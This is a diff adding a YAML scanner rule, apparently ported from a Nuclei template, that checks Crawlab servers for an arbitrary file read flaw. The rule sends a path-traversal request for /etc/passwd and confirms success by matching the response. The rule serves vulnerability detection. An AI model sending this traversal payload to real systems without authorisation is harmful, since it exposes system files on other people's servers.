@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:crawlab-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Crawlab - Arbitrary File Read"
+  description: "Crawlab is vulnerable to arbitrary file read. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Crawlab%20file%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  cwes: [23]
+  tags: ["crawlab", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/api/file?path=../../etc/passwd" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "data\":\"" } }
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "error\":" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
